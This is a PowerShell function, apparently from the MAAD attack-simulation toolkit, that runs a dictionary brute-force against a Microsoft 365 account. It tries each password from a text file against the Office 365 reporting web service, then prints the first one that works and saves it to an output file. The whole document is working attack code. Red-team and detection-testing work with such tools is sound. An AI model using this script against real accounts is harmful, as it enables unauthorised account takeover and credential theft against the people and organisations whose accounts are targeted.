function BruteForce {

    mitre_details("BruteForce")

    #Get account to target
    EnterAccount ("nEnter an account to brute-force (eg:user@org.com) or enter 'recon' to find all available accounts")
    $username = $global:input_user_account

    #Check file input
    $check_file = $false
    while ($check_file -eq $false) {
        $filename = Read-Host -Prompt "`nEnter the password dictionary text file name (include file extension)"
        $check_file = Test-Path -Path .\$filename
        
        if ($check_file) {
            Write-Host "File found!!!"
            #Check file format - Only txt files accepted
            $extn = [IO.Path]::GetExtension($filename) 
            if ($extn -ne ".txt") {
                Write-Host "`nInvalid file type: Please provide a 'txt' dictionary file with each password on a new line."
                $check_file = $false
            }
            else {
                $check_file = $true
            } 
        }
        else {
            Write-Host "`nPassword file: "$filename" not found. Check -`n1.If the spelling is correct`n2.If the file exists in the root directory of MAAD`n3.Include extension in filename"
        }
    }
    
    #Read input password file
    $passwords = Get-Content -Path .\$filename

    Write-Host "`nStarting brute-force on user: $username using the password dictionary: $filename..."
    [int]$counter = 0
    Write-Progress -Activity "Running brute force" -Status "0% complete:" -PercentComplete 0;

    #Perform Brute-force.
    foreach ($password in $passwords) {
        #Convert password to secure string.
        $securestring = ConvertTo-SecureString $password -AsPlainText -Force

        #Create PSCredential object
        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $securestring)

        #Test authentication to Office 365 reporting API
        try {
            Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $credential -UseBasicParsing | Out-Null

            #Create custom object
            $userobject = New-Object -TypeName psobject
            $userobject | Add-Member -MemberType NoteProperty -Name "UserName" -Value $username
            $userobject | Add-Member -MemberType NoteProperty -Name "Password" -Value $password
            
            Write-Host "`nSuccess is No Accident ;) Successfully cracked account password!!!" -ForegroundColor Yellow -BackgroundColor Black
            $userobject | Format-Table 
            $userobject | Out-File -FilePath .\Outputs\Internal_BruteForce_Result.txt
            break 
        } 
        catch {
            $counter++
            Write-Progress -Activity "Running brute-force attack" -Status "$([math]::Round($counter/$passwords.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $passwords.Count * 100));
        }
    }
    #Print if brute-force unsuccessful
    if ($userobject -eq $null){
        Write-Host "`nBrute-force Unsuccessful!!! Try another password dictionary or account!!!" -ForegroundColor Yellow -BackgroundColor Black
    }
    Pause
}